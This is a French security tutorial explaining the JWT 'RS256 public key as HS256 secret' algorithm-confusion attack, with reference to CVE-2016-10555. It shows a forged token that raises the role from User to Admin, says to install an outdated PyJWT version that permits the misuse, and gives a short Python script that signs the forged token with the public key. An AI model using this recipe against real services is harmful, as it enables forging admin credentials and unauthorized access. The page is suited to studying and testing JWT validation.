# JWS - RS256 Public-Key as HS256 Secret Attack

En cryptographie asymétrique, la clé publique est en général récupérable par tout le monde. La clé publique sert à chiffrer une donnée à destination du possesseur de la clé privée ou alors à  vérifier la signature d'une donnée signée par le possesseur de la clé privée. En admettant que l'attaquant ai accès à cette clé, il lui est alors parfois possible de modifier le jeton afin de tromper le service consommateur en lui faisant croire qu'il s'agit d'un jeton signé utilisant un secret partagé.

 Admettons le jeton suivant :

`{  
  "alg":"RS256",  
  "typ":"JWT"  
}  
{  
  "name":"Sharpforce",  
  "role":"User"  
}`

Etant donné que le jeton est signé en utilisant un algorithme asymétrique, le service doit normalement vérifier la signature en utilisant la clé publique à sa disposition. Mais l'attaquant peut tenter de forcer le service à vérifier le jeton en lui faisant croire qu'il s'agit d'une signature à secret partagé \(en modifiant l'algorithme dans l'entête du jeton\) :

`{  
  "alg":"HS256",  
  "typ":"JWT"  
}  
{  
  "name":"Sharpforce",  
  "role":"Admin"  
}`

Cette fois, contrairement à l'attaque précédente, l'attaquant _connait_ la "clé partagée" utilisée pour la signature.

Afin d'[exploiter](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256) facilement cette vulnérabilité, il est possible d'utiliser la librairie PyJWT de Python :

`pip install pyjwt==0.4.3`

Il est important d'utiliser la version 0.4.3 de la librairie, car sur les versions supérieures utiliser une clé publique en tant que secret partagé est interdit :

```text
Traceback (most recent call last): 
  File "<stdin>", line 1, in <module>
  File "/usr/local/lib/python2.7/dist-packages/jwt/api_jwt.py", line 65, in encode
    json_payload, key, algorithm, headers, json_encoder
  File "/usr/local/lib/python2.7/dist-packages/jwt/api_jws.py", line 113, in encode
    key = alg_obj.prepare_key(key)
  File "/usr/local/lib/python2.7/dist-packages/jwt/algorithms.py", line 151, in prepare_key
    'The specified key is an asymmetric key or x509 certificate and'
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

Puis sous Python \(le fichier _public.pem_ représente la clé publique\) :

```python
import jwt
public = open('public.pem', 'r').read()
print jwt.encode({"name":"Sharpforce", "role":"Admin"}, key=public, algorithm='HS256')
```

Pour résumer, cette attaque consiste à faire passer une signature à clés symétriques à une signature à secret partagé. La clé publique devenant ainsi le secret partagé, l'attaquant peut alors modifier puis signer le jeton illégitime \(ou alors en forger un nouveau\).

Cette vulnérabilité est présente dans la libraire Node.js `jwt-simple` pour les version &lt;= 0.3.0 sous la dénomination CVE-2016-10555 : 

{% embed url="https://nvd.nist.gov/vuln/detail/CVE-2016-10555" %}

## \*\*\*\*

